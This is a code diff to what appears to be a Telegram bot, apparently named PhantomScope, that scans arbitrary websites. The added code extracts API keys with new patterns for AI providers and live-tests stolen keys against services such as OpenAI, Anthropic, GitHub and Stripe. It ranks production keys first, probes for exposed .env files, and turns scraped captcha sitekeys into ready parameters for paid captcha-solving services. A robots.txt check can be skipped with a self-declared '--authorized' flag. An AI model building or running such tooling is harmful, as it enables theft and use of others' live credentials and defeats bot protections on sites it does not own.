@@ -3242,6 +3242,11 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for stype, (pattern, risk) in _SECRET_PATTERNS.items():
                 for match in re.finditer(pattern, content):
                     val = match.group(0)
+                    # ── Phase 1: FP filter ────────────────────────
+                    is_fp, fp_reason = _fp_is_placeholder(val, stype)
+                    if is_fp:
+                        continue
+                    # ─────────────────────────────────────────────
                     # Store FULL value in findings (goes into ZIP report, not Telegram message)
                     dedup_key = stype + val[:40]
                     if dedup_key in seen_keys:
@@ -5080,6 +5085,119 @@ _KEY_VALIDATORS = {
     "FunCaptcha":           lambda k: bool(re.match(r'^[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}$', k, re.I)),
 }
 
+# ENH15: API live validators dict used by _validate_api_key
+_API_LIVE_VALIDATORS = {
+    "OpenAI": {
+        "url": "https://api.openai.com/v1/models",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "OpenAI Project key": {
+        "url": "https://api.openai.com/v1/models",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "Google Maps / Places / YouTube": {
+        "url": "https://maps.googleapis.com/maps/api/geocode/json?address=test&key={key}",
+        "valid_if":   lambda r: r.status_code == 200 and "REQUEST_DENIED" not in r.text,
+        "invalid_if": lambda r: "REQUEST_DENIED" in r.text or r.status_code == 403,
+    },
+    "Stripe Publishable Key": {
+        "url": "https://api.stripe.com/v1/tokens",
+        "method": "POST",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code in (400, 402),
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "Stripe Publishable Key (dynamic)": {
+        "url": "https://api.stripe.com/v1/tokens",
+        "method": "POST",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code in (400, 402),
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "HuggingFace Token": {
+        "url": "https://huggingface.co/api/whoami-v2",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200 and "name" in r.text,
+        "invalid_if": lambda r: r.status_code in (401, 403),
+    },
+    "Anthropic API Key": {
+        "url": "https://api.anthropic.com/v1/models",
+        "headers": {"x-api-key": "{key}", "anthropic-version": "2023-06-01"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "Groq API Key": {
+        "url": "https://api.groq.com/openai/v1/models",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "Replicate API Token": {
+        "url": "https://api.replicate.com/v1/account",
+        "headers": {"Authorization": "Token {key}"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "SendGrid": {
+        "url": "https://api.sendgrid.com/v3/user/account",
+        "headers": {"Authorization": "Bearer {key}"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "Mailgun API Key": {
+        "url": "https://api.mailgun.net/v3/domains",
+        "headers": {"Authorization": "Basic {key}"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "GitHub Token": {
+        "url": "https://api.github.com/user",
+        "headers": {"Authorization": "token {key}", "Accept": "application/vnd.github.v3+json"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "GitHub PAT (classic)": {
+        "url": "https://api.github.com/user",
+        "headers": {"Authorization": "token {key}", "Accept": "application/vnd.github.v3+json"},
+        "valid_if":   lambda r: r.status_code == 200,
+        "invalid_if": lambda r: r.status_code == 401,
+    },
+    "Twilio Account SID": {
+        "url": "https://api.twilio.com/2010-04-01/Accounts/{key}.json",
+        "valid_if":   lambda r: r.status_code in (200, 401),
+        "invalid_if": lambda r: r.status_code == 404,
+    },
+}
+
+
+def _classify_api_env(key_type: str, key_value: str) -> str:
+    """ENH16: Classify API key as PROD/TEST/DEV based on provider-specific rules."""
+    kv = key_value.lower()
+    kt = key_type.lower()
+    if "stripe" in kt or "paystack" in kt or "clerk" in kt:
+        if any(x in kv for x in ("_live_", "pk_live", "sk_live", "rk_live")):
+            return "🔴 PROD"
+        if any(x in kv for x in ("_test_", "pk_test", "sk_test")):
+            return "🟡 TEST"
+    if "flutterwave" in kt:
+        return "🟡 TEST" if "_TEST" in key_value else "🔴 PROD"
+    if "square" in kt:
+        return "🟡 TEST" if "sandbox" in kv else "🔴 PROD"
+    for live_kw in ("_live_", "_prod_", "_production_", "live_", "prod_"):
+        if live_kw in kv:
+            return "🔴 PROD"
+    for test_kw in ("_test_", "_sandbox_", "_dev_", "_staging_", "test_", "sandbox_"):
+        if test_kw in kv:
+            return "🟡 TEST"
+    return "⚪ UNKNOWN"
+
+
+
+
 # Priority scan order (most specific first to avoid mis-attribution)
 _CAPTCHA_SCAN_ORDER = [
     "reCAPTCHA Enterprise",
@@ -5377,8 +5495,14 @@ def _sitekey_playwright(url: str, progress_cb=None) -> dict:
 
     def _add(cap_type, key, source, extra=None):
         key = key.strip()
-        dedup = cap_type + ":" + key
+        # ── Phase 1: normalize key for dedup (case-insensitive, strip padding) ──
+        key_norm = key.lower().rstrip("=")
+        dedup    = cap_type + ":" + key_norm
         if dedup not in seen_keys and len(key) >= 10:
+            # ── Phase 1: reject placeholder site keys ─────────────────────────
+            is_fp, _ = _fp_is_placeholder(key, "sitekey")
+            if is_fp:
+                return
             seen_keys.add(dedup)
             ex = extra or {}
             findings.append({
@@ -5477,6 +5601,41 @@ def _sitekey_playwright(url: str, progress_cb=None) -> dict:
             Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
             Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
             window.chrome = {runtime: {}};
+
+            // ENH2: MutationObserver — catch SPA-injected captcha widgets
+            window.__captchaMutations = [];
+            (function() {
+                const obs = new MutationObserver(function(mutations) {
+                    mutations.forEach(function(m) {
+                        m.addedNodes.forEach(function(node) {
+                            if (!node.querySelectorAll) return;
+                            node.querySelectorAll('[data-sitekey]').forEach(function(el) {
+                                var k = el.getAttribute('data-sitekey');
+                                if (k && k.length >= 10) {
+                                    window.__captchaMutations.push({
+                                        key: k, tag: el.tagName,
+                                        type: el.className || '',
+                                        action: el.getAttribute('data-action') || '',
+                                        theme: el.getAttribute('data-theme') || '',
+                                        size: el.getAttribute('data-size') || '',
+                                    });
+                                }
+                            });
+                            if (node.getAttribute && node.getAttribute('data-sitekey')) {
+                                var k = node.getAttribute('data-sitekey');
+                                if (k && k.length >= 10) {
+                                    window.__captchaMutations.push({
+                                        key: k, tag: node.tagName || 'unknown',
+                                        type: node.className || '',
+                                        action: node.getAttribute('data-action') || '',
+                                    });
+                                }
+                            }
+                        });
+                    });
+                });
+                obs.observe(document.documentElement, {childList: true, subtree: true});
+            })();
         """)
 
         page = ctx.new_page()
@@ -5513,11 +5672,30 @@ def _sitekey_playwright(url: str, progress_cb=None) -> dict:
             except Exception:
                 pass
 
-        page.on("request",  _on_request)
-        page.on("response", _on_response)
-        page.on("console",  _on_console)
+        # ── ENH1: WebSocket frame scanning for captcha sitekeys ──────────────
+        def _on_websocket(ws):
+            def _scan_ws(payload):
+                try:
+                    text = str(payload)
+                    for pat, cap_type in _NET_PATTERNS:
+                        m = pat.search(text)
+                        if m:
+                            _add(cap_type, m.group(1), f"WebSocket frame: {ws.url[:80]}")
+                    for pat, label in _BODY_PATTERNS:
+                        for m in pat.finditer(text):
+                            _add(_classify_key(m.group(1)), m.group(1),
+                                 f"WebSocket ({label}): {ws.url[:60]}")
+                except Exception:
+                    pass
+            ws.on("framereceived", _scan_ws)
+            ws.on("framesent",     _scan_ws)
 
-        if progress_cb: progress_cb("📡 Loading page (intercepting all network traffic)...")
+        page.on("request",   _on_request)
+        page.on("response",  _on_response)
+        page.on("console",   _on_console)
+        page.on("websocket", _on_websocket)
+
+        if progress_cb: progress_cb("📡 Loading page (intercepting all network + WS traffic)...")
 
         try:
             page.goto(url, wait_until="load", timeout=30_000)
@@ -5886,7 +6064,22 @@ def _sitekey_playwright(url: str, progress_cb=None) -> dict:
         except Exception:
             pass
 
-        browser.close()
+        # ── ENH2: Harvest MutationObserver captcha injections ────────────────
+        try:
+            mutations = page.evaluate("() => window.__captchaMutations || []")
+            for item in (mutations or []):
+                key = (item.get("key") or "").strip()
+                if key and len(key) >= 10:
+                    hint = _classify_key(key)
+                    extra = {
+                        "action":    item.get("action", ""),
+                        "theme":     item.get("theme", ""),
+                        "size":      item.get("size", ""),
+                        "invisible": item.get("size", "") == "invisible",
+                    }
+                    _add(hint, key, f"MutationObserver (SPA inject): {item.get('tag','')}", extra)
+        except Exception:
+            pass
 
     # ── Console log scan ─────────────────────────────
     if console_log:
@@ -5908,6 +6101,72 @@ def _sitekey_playwright(url: str, progress_cb=None) -> dict:
         "error":       None,
         "network_log": network_log,   # list of request URL strings
     }
+
+
+# ── ENH3: Sub-page sitekey scanner ───────────────────────────────────────
+_SITEKEY_SUBPAGES = [
+    "/login", "/signin", "/sign-in", "/register", "/signup", "/sign-up",
+    "/checkout", "/cart", "/pay", "/payment", "/contact", "/contact-us",
+    "/donate", "/support", "/reset-password", "/forgot-password",
+]
+
+def _sitekey_scan_subpages(base_url: str, progress_cb=None) -> list:
+    """
+    ENH3: Crawl up to 5 common sub-pages and run static sitekey scan on each.
+    Returns merged list of additional findings not seen on the base page.
+    """
+    from urllib.parse import urlparse, urljoin
+    parsed   = urlparse(base_url)
+    origin   = f"{parsed.scheme}://{parsed.netloc}"
+    findings = []
+    seen_keys = set()
+
+    def _static_scan(html: str, page_url: str) -> list:
+        found = []
+        for cap_type, patterns in _CAPTCHA_PATTERNS.items():
+            for pat in patterns:
+                for m in pat.finditer(html):
+                    try:
+                        key = next((g for g in m.groups() if g), m.group(0)).strip()
+                    except Exception:
+                        continue
+                    dedup = cap_type + ":" + key
+                    if key and len(key) >= 10 and dedup not in seen_keys:
+                        seen_keys.add(dedup)
+                        found.append({
+                            "type":     cap_type,
+                            "site_key": key,
+                            "page_url": page_url,
+                            "action":   "",
+                            "source":   f"Sub-page static scan: {page_url}",
+                            "theme": "", "size": "", "invisible": False,
+                            "badge": "", "min_score": "", "enterprise": False,
+                            "s_param": "", "hl": "", "co": "", "callback": "",
+                            "user_agent": "",
+                        })
+        return found
+
+    scanned = 0
+    for path in _SITEKEY_SUBPAGES:
+        if scanned >= 5:
+            break
+        sub_url = urljoin(origin, path)
+        try:
+            import requests as _req
+            r = _req.get(sub_url, headers=_get_headers(), timeout=8,
+                         allow_redirects=True, verify=False)
+            if r.status_code == 200 and "text/html" in r.headers.get("content-type",""):
+                new_hits = _static_scan(r.text, r.url)
+                if new_hits:
+                    findings.extend(new_hits)
+                    if progress_cb:
+                        progress_cb(f"🔑 Sub-page {path}: {len(new_hits)} captcha(s)")
+                scanned += 1
+        except Exception:
+            pass
+
+    return findings
+
 
 def _sitekey_sync(url: str, progress_cb=None) -> dict:
     """
@@ -6015,6 +6274,12 @@ def _sitekey_with_subpages(url: str, progress_cb=None) -> dict:
         "/pricing", "/plans", "/subscribe", "/membership",
         "/join", "/support", "/help", "/feedback",
         "/order", "/pay", "/billing", "/upgrade",
+        # ENH3: additional paths
+        "/sign-in", "/sign-up", "/forgot-password", "/reset-password",
+        "/create-account", "/account/login", "/user/login",
+        "/auth/login", "/auth/register", "/auth/signup",
+        "/contact-us", "/reach-us", "/get-in-touch",
+        "/book", "/booking", "/appointment", "/schedule",
     ]
 
     all_findings  = []
@@ -6153,6 +6418,141 @@ def _sitekey_static(url: str, progress_cb=None) -> dict:
     return {"findings": findings, "page_url": page_url, "js_fetched": len(js_sources), "error": None}
 
 
+def _check_robots_permission(url: str) -> dict:
+    """
+    Fetch robots.txt and check if scanning is allowed for the given URL path.
+    Returns {"allowed": bool, "status": str, "note": str}
+    """
+    try:
+        from urllib.robotparser import RobotFileParser
+        from urllib.parse import urlparse as _up
+        parsed   = _up(url)
+        base     = f"{parsed.scheme}://{parsed.netloc}"
+        robots_url = base + "/robots.txt"
+        rp = RobotFileParser()
+        rp.set_url(robots_url)
+        rp.read()
+        path     = parsed.path or "/"
+        ua       = "PhantomScope"
+        allowed  = rp.can_fetch(ua, path) and rp.can_fetch("*", path)
+        if allowed:
+            crawl_delay = rp.crawl_delay("*") or rp.crawl_delay(ua)
+            note = (
+                f"robots.txt က scanning ခွင့်ပြုသည်"
+                + (f" (crawl-delay: {crawl_delay}s)" if crawl_delay else "")
+            )
+            return {"allowed": True, "status": "✅ Allowed", "note": note}
+        else:
+            return {
+                "allowed": False,
+                "status":  "🚫 Disallowed by robots.txt",
+                "note":    (
+                    f"{parsed.netloc}/robots.txt မှာ `{path}` ကို "
+                    "bot scan ခွင့်မပြု — မိမိ site မဟုတ်ပါက scan မလုပ်သင့်ပါ"
+                ),
+            }
+    except Exception as e:
+        # robots.txt fetch မရရင် → warning ပြပြီး allow (site မှာ robots.txt မရှိနိုင်)
+        return {
+            "allowed": True,
+            "status":  "⚠️ robots.txt မတွေ့ (allow မည်)",
+            "note":    f"robots.txt fetch မရ ({str(e)[:60]}) — site မှာ မရှိနိုင်သည်",
+        }
+
+
+def _get_solver_params(f: dict) -> dict:
+    """
+    Build per-service solver param dicts for a captcha finding.
+    Returns {
+        "2captcha":    {...},
+        "anticaptcha": {...},
+        "capsolver":   {...},
+        "ezcaptcha":   {...},
+    }
+    """
+    cap_type  = f.get("type", "")
+    sitekey   = f.get("site_key") or f.get("value") or ""
+    pageurl   = f.get("page_url", "")
+    action    = f.get("action", "")
+    min_score = f.get("min_score", "")
+    invisible = f.get("invisible", False)
+    enterprise = f.get("enterprise", False)
+    s_param   = f.get("s_param", "")
+    ua        = f.get("user_agent", "")
+
+    # ── 2captcha / Anti-Captcha task type mapping ──────────────────
+    def _2cap_task(ct):
+        if "Enterprise" in ct:
+            return ("RecaptchaV2EnterpriseTaskProxyless" if "v2" in ct.lower() or "v2" in ct
+                    else "RecaptchaV3TaskProxyless")
+        if "v3" in ct:   return "RecaptchaV3TaskProxyless"
+        if "v2" in ct:   return "RecaptchaV2TaskProxyless"
+        if "hCaptcha" in ct: return "HCaptchaTaskProxyless"
+        if "Turnstile" in ct: return "TurnstileTaskProxyless"
+        if "FunCaptcha" in ct: return "FunCaptchaTaskProxyless"
+        if "GeeTest" in ct:   return "GeeTestTaskProxyless"
+        if "AWS" in ct:       return "RecaptchaV2TaskProxyless"
+        return "RecaptchaV2TaskProxyless"
+
+    # ── CapSolver task type mapping ────────────────────────────────
+    def _caps_task(ct):
+        if "Enterprise" in ct and "v2" in ct: return "ReCaptchaV2EnterpriseTaskProxyLess"
+        if "Enterprise" in ct and "v3" in ct: return "ReCaptchaV3EnterpriseTaskProxyLess"
+        if "v3" in ct:   return "ReCaptchaV3TaskProxyLess"
+        if "v2" in ct or "Enterprise" in ct: return "ReCaptchaV2TaskProxyLess"
+        if "hCaptcha" in ct: return "HCaptchaTaskProxyLess"
+        if "Turnstile" in ct: return "AntiTurnstileTaskProxyLess"
+        if "FunCaptcha" in ct: return "FunCaptchaTaskProxyLess"
+        if "GeeTest" in ct:   return "GeeTestTaskProxyLess"
+        return "ReCaptchaV2TaskProxyLess"
+
+    # ── Ez-Captcha / NextCaptcha task type mapping ─────────────────
+    def _ez_task(ct):
+        if "v3" in ct:   return "ReCaptchaV3TaskProxyless"
+        if "v2" in ct or "Enterprise" in ct: return "ReCaptchaV2TaskProxyless"
+        if "hCaptcha" in ct: return "HCaptchaTaskProxyless"
+        if "Turnstile" in ct: return "TurnstileTaskProxyless"
+        if "FunCaptcha" in ct: return "FunCaptchaTaskProxyless"
+        return "ReCaptchaV2TaskProxyless"
+
+    is_v3 = "v3" in cap_type
+    is_hcap = "hCaptcha" in cap_type
+    is_turnstile = "Turnstile" in cap_type
+    is_funcaptcha = "FunCaptcha" in cap_type
+
+    # ── 2captcha params ────────────────────────────────────────────
+    p2c = {"type": _2cap_task(cap_type), "googlekey": sitekey, "pageurl": pageurl}
+    if is_hcap:       p2c = {"type": _2cap_task(cap_type), "sitekey": sitekey, "pageurl": pageurl}
+    if is_turnstile:  p2c = {"type": _2cap_task(cap_type), "sitekey": sitekey, "pageurl": pageurl}
+    if is_funcaptcha: p2c = {"type": _2cap_task(cap_type), "publickey": sitekey, "pageurl": pageurl}
+    if is_v3 and action:    p2c["action"]   = action
+    if is_v3 and min_score: p2c["min_score"] = min_score
+    if not is_v3 and invisible: p2c["invisible"] = "1"
+    if enterprise and not is_v3: p2c["enterprise"] = "1"
+    if s_param:  p2c["data-s"]    = s_param
+    if ua:       p2c["userAgent"] = ua
+
+    # Anti-Captcha uses same format as 2captcha
+    pac = dict(p2c)
+
+    # ── CapSolver params ───────────────────────────────────────────
+    pcs = {"type": _caps_task(cap_type), "websiteURL": pageurl, "websiteKey": sitekey}
+    if is_v3 and action:    pcs["pageAction"] = action
+    if is_v3 and min_score: pcs["minScore"]   = float(min_score) if min_score else 0.5
+    if not is_v3 and invisible: pcs["isInvisible"] = True
+    if s_param: pcs["recaptchaDataSValue"] = s_param
+    if ua:      pcs["userAgent"] = ua
+
+    # ── Ez-Captcha / NextCaptcha params ───────────────────────────
+    pez = {"type": _ez_task(cap_type), "websiteURL": pageurl, "websiteKey": sitekey}
+    if is_v3 and action:    pez["pageAction"] = action
+    if is_v3 and min_score: pez["minScore"]   = min_score
+    if not is_v3 and invisible: pez["isInvisible"] = True
+    if enterprise: pez["enterprisePayload"] = {}
+
+    return {"2captcha": p2c, "anticaptcha": pac, "capsolver": pcs, "ezcaptcha": pez}
+
+
 async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """/sitekey <url> — Extract reCAPTCHA/hCaptcha/Turnstile site_key, page_url, action"""
     if not await check_force_join(update, context):
@@ -6160,7 +6560,9 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not context.args:
         await update.effective_message.reply_text(
-            "📌 *Usage:* `/sitekey https://example.com`\n\n"
+            "📌 *Usage:*\n"
+            "  `/sitekey https://example.com` — auto permission check\n"
+            "  `/sitekey https://example.com --authorized` — skip robots check\n\n"
             "🔑 *Extracts:*\n"
             "  • `site_key` — Captcha public key\n"
             "  • `page_url` — Final URL (after redirects)\n"
@@ -6175,7 +6577,8 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "  • GeeTest\n"
             "  • AWS WAF Captcha\n\n"
             "📦 HTML source + JS bundles ကို scan မည်\n"
-            "⚠️ _Authorized testing only_",
+            "⚠️ _Authorized testing only_\n"
+            "🔒 _`--authorized` flag — မိမိ site သို့မဟုတ် permission ရထားတဲ့ site အတွက်_",
             parse_mode='Markdown'
         )
         return
@@ -6186,7 +6589,11 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
         return
 
-    url = context.args[0].strip()
+    # ── Parse args: url + optional --authorized flag ───────────────
+    raw_args      = context.args
+    authorized    = "--authorized" in raw_args
+    url_arg       = next((a for a in raw_args if not a.startswith("--")), "")
+    url           = url_arg.strip()
     if not url.startswith('http'):
         url = 'https://' + url
 
@@ -6196,7 +6603,52 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     domain = urlparse(url).netloc
-    msg = await update.effective_message.reply_text(
+
+    # ── robots.txt permission check (skip if --authorized) ─────────
+    if not authorized:
+        chk_msg = await update.effective_message.reply_text(
+            f"🔒 *Permission Check — `{escape_md(domain)}`*\n\n"
+            "📄 `robots.txt` စစ်ဆေးနေသည်...",
+            parse_mode='Markdown'
+        )
+        robots_result = await asyncio.to_thread(_check_robots_permission, url)
+        allowed_scan  = robots_result["allowed"]
+        robots_note   = robots_result["note"]
+        robots_status = robots_result["status"]
+
+        if not allowed_scan:
+            await chk_msg.edit_text(
+                f"🔒 *Permission Check — `{escape_md(domain)}`*\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"🚫 *Scan ခွင့်မပြု*\n\n"
+                f"📄 `robots.txt`: {robots_status}\n"
+                f"📝 {escape_md(robots_note)}\n\n"
+                f"မိမိကိုယ်ပိုင် site သို့မဟုတ် permission ရထားပါက:\n"
+                f"`/sitekey {escape_md(url)} --authorized`",
+                parse_mode='Markdown'
+            )
+            return
+
+        # robots.txt ခွင့်ပြုသည် — permission note ပြပြီး ဆက်လုပ်
+        await chk_msg.edit_text(
+            f"🔒 *Permission Check — `{escape_md(domain)}`*\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"✅ {robots_status}\n"
+            f"📝 {escape_md(robots_note)}\n\n"
+            f"⏳ Scan စတင်နေသည်...",
+            parse_mode='Markdown'
+        )
+    else:
+        chk_msg = await update.effective_message.reply_text(
+            f"🔒 *Permission Check — `{escape_md(domain)}`*\n\n"
+            "✅ `--authorized` flag — permission ကြေညာပြီး\n"
+            "⏳ Scan စတင်နေသည်...",
+            parse_mode='Markdown'
+        )
+
+    msg = chk_msg
+    await asyncio.sleep(1)
+    await msg.edit_text(
         f"🔑 *Site Key Extractor*\n🌐 `{escape_md(domain)}`\n\n"
         "🌐 Launching headless browser...\n"
         "📡 Intercepting network requests...\n"
@@ -6331,21 +6783,30 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lines.append(f"  📂 Source      : _{f.get('source','')[:70]}_")
         lines.append("")
 
-        # ── Solver-ready block ─────────────────────────────
-        lines.append("  *📋 Solver params (copy-ready):*")
-        lines.append(f"  `type`      = `{f['type']}`")
-        lines.append(f"  `sitekey`   = `{f.get('site_key') or f.get('value') or ''}`")
-        lines.append(f"  `pageurl`   = `{f.get('page_url', '')}`")
-        if f.get("action"):
-            lines.append(f"  `action`    = `{f['action']}`")
-        if f.get("enterprise"):
-            lines.append(f"  `enterprise`= `1`")
-        if f.get("min_score"):
-            lines.append(f"  `min_score` = `{f['min_score']}`")
-        if f.get("invisible"):
-            lines.append(f"  `invisible` = `1`")
-        if f.get("s_param"):
-            lines.append(f"  `data-s`    = `{f['s_param'][:40]}`")
+        # ── Solver-ready block (per-service) ──────────────────────
+        sp = _get_solver_params(f)
+
+        def _fmt_params(d: dict) -> str:
+            return "\n".join(f"    `{k}` = `{v}`" for k, v in d.items())
+
+        lines.append("  *📋 Solver Params:*")
+
+        # 2captcha
+        lines.append("  *🔴 2captcha:*")
+        lines.append(_fmt_params(sp["2captcha"]))
+
+        # Anti-Captcha
+        lines.append("  *🟠 Anti-Captcha:*")
+        lines.append(_fmt_params(sp["anticaptcha"]))
+
+        # CapSolver
+        lines.append("  *🟢 CapSolver:*")
+        lines.append(_fmt_params(sp["capsolver"]))
+
+        # Ez-Captcha / NextCaptcha
+        lines.append("  *🔵 Ez-Captcha / NextCaptcha:*")
+        lines.append(_fmt_params(sp["ezcaptcha"]))
+
         lines.append("")
 
     lines.append("━━━━━━━━━━━━━━━━━━")
@@ -6393,20 +6854,8 @@ async def cmd_sitekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "co":         f.get("co", ""),
                 "callback":   f.get("callback", ""),
                 "user_agent": f.get("user_agent", ""),
-                # ── Solver-ready format ──
-                "solver_params": {
-                    k: v for k, v in {
-                        "type":       f["type"],
-                        "sitekey":    f["site_key"],
-                        "pageurl":    f["page_url"],
-                        "action":     f.get("action"),
-                        "enterprise": 1 if f.get("enterprise") else None,
-                        "min_score":  f.get("min_score") or None,
-                        "invisible":  1 if f.get("invisible") else None,
-                        "data-s":     f.get("s_param") or None,
-                        "useragent":  f.get("user_agent") or None,
-                    }.items() if v is not None and v != ""
-                },
+                # ── Solver-ready format (per-service) ──
+                "solver_params": _get_solver_params(f),
             }
             for f in findings
         ],
@@ -8456,6 +8905,16 @@ _API_KEY_PATTERNS = [
     ("Shopify Storefront Token",         re.compile(r'(?i)shopify.{0,30}token.{0,10}[=:\s]["\']?([a-f0-9]{32})\b')),
     # Generic secret/api key patterns
     ("Generic API Key",                  re.compile(r'(?i)(?:api[_\-]?key|apikey|api[_\-]?token|access[_\-]?key|secret[_\-]?key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,80})["\']')),
+    # ENH14: AI / ML provider keys
+    ("Anthropic API Key",                re.compile(r'\b(sk-ant-(?:api03|api|[A-Za-z0-9]{4})-[A-Za-z0-9_\-]{80,})\b')),
+    ("HuggingFace Token",                re.compile(r'\b(hf_[A-Za-z0-9]{34,})\b')),
+    ("Replicate API Token",              re.compile(r'\b(r8_[A-Za-z0-9]{37,})\b')),
+    ("Groq API Key",                     re.compile(r'\b(gsk_[A-Za-z0-9]{50,})\b')),
+    ("Cohere API Key",                   re.compile(r'\b(co_[A-Za-z0-9_\-]{32,})\b')),
+    ("Together AI Key",                  re.compile(r'(?:TOGETHER_API_KEY)\s*[=:]\s*["\']?([a-f0-9]{64})')),
+    ("Mistral API Key",                  re.compile(r'(?:MISTRAL_API_KEY)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{32,})')),
+    ("OpenRouter API Key",               re.compile(r'\b(sk-or-v1-[A-Za-z0-9_\-]{40,})\b')),
+    ("Stability AI Key",                 re.compile(r'(?:STABILITY_API_KEY)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{40,})')),
 ]
 
 # Phase 2: process.env / import.meta.env static replacement scan
@@ -8549,8 +9008,13 @@ def _validate_api_key(key_type: str, key_value: str, timeout: int = 6) -> dict:
     """
     Phase 3: Live-probe one API key.
     Returns {"status": "valid"|"invalid"|"unknown"|"skipped", "note": str}
+    ENH15: Now uses _API_LIVE_VALIDATORS for full URL-based probing.
     """
-    validator = _KEY_VALIDATORS.get(key_type)
+    # ENH15: prefer _API_LIVE_VALIDATORS (url/valid_if structure)
+    validator = _API_LIVE_VALIDATORS.get(key_type)
+    if validator is None:
+        # fallback: try prefix match
+        validator = next((v for k, v in _API_LIVE_VALIDATORS.items() if k in key_type), None)
     if validator is None:
         return {"status": "skipped", "note": "No probe configured"}
 
@@ -8788,7 +9252,10 @@ def _apikeys_sync(url: str, progress_cb=None) -> dict:
         if dedup in seen or len(value) < 10:
             return
         seen.add(dedup)
-        findings.append({"type": key_type, "value": value, "source": source})
+        # ENH16: classify env (PROD/TEST/UNKNOWN)
+        env_class = _classify_api_env(key_type, value)
+        findings.append({"type": key_type, "value": value, "source": source,
+                         "env": env_class})
 
     if progress_cb: progress_cb("🔍 Scanning all sources for API keys...")
 
@@ -8828,12 +9295,43 @@ def _apikeys_sync(url: str, progress_cb=None) -> dict:
     for wf in wasm_findings:
         _add(wf["type"], wf.get("value","")[:60], wf["source"])
 
+    # ENH17: .env file exposure probe
+    if progress_cb:
+        progress_cb("🔍 ENH17: Probing for exposed .env files...")
+    try:
+        env_exposed = _probe_env_files(url)
+        for env_path, env_body in env_exposed:
+            # Scan .env content through _API_KEY_PATTERNS
+            for key_type, pat in _API_KEY_PATTERNS:
+                for m in pat.finditer(env_body):
+                    val = m.group(1) if m.lastindex else m.group(0)
+                    _add(f"{key_type} 🚨 EXPOSED .env",
+                         val.strip(),
+                         f"EXPOSED FILE: {env_path}")
+            # Also high-entropy scan of raw .env
+            for line in env_body.splitlines():
+                if "=" in line and not line.strip().startswith("#"):
+                    k_part, _, v_part = line.partition("=")
+                    v_part = v_part.strip().strip('"').strip("'")
+                    if len(v_part) >= 16:
+                        _add(f"Exposed .env var 🚨 ({k_part.strip()})",
+                             v_part[:200],
+                             f"EXPOSED FILE: {env_path}")
+    except Exception:
+        pass
+
     # Phase 3: Live validation of discovered keys
     if progress_cb:
         progress_cb("🔬 Running live key validation...")
     findings = _validate_findings(findings, progress_cb)
 
     valid_count = len([f for f in findings if f.get("validation",{}).get("status") == "valid"])
+    # ENH16: sort PROD keys to top
+    findings.sort(key=lambda f: (
+        0 if "🔴 PROD" in f.get("env","") else
+        1 if f.get("validation",{}).get("status") == "valid" else
+        2 if "🟡 TEST" in f.get("env","") else 3
+    ))
     return {"error": None, "findings": findings, "page_url": data["page_url"],
             "requests": len(data.get("network_log", [])),
             "sourcemap_scanned": len(sm_findings) > 0,
@@ -8921,9 +9419,16 @@ async def cmd_apikeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [(f, "\u26a0\ufe0f STATIC") for f in static_only]
     )
     for i, (f, badge) in enumerate(ordered[:25], 1):
-        lines.append(f"*[{i}]* {badge} `{f['type']}`")
+        env_badge = f.get("env", "")
+        val_badge = ""
+        vs = f.get("validation", {}).get("status", "")
+        if vs == "valid":   val_badge = " ✅"
+        elif vs == "invalid": val_badge = " ❌"
+        lines.append(f"*[{i}]* {badge}{val_badge} `{f['type']}`")
+        if env_badge and env_badge != "⚪ UNKNOWN":
+            lines.append(f"  Env: {env_badge}")
         lines.append(f"  `{f['value'][:80]}`")
-        lines.append(f"  _\U0001f4c2 {f.get('source','')[:60]}_\n")
+        lines.append(f"  _📂 {f.get('source','')[:60]}_\n")
     lines.append("\u2501"*18 + "\n\u26a0\ufe0f _Authorized testing only_")
     report = "\n".join(lines)
     try:
@@ -9683,8 +10188,109 @@ Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
 window.chrome = {runtime: {}};
 window.__payHook = {
     paymentRequests: [], squareInits: [], adyenInits: [],
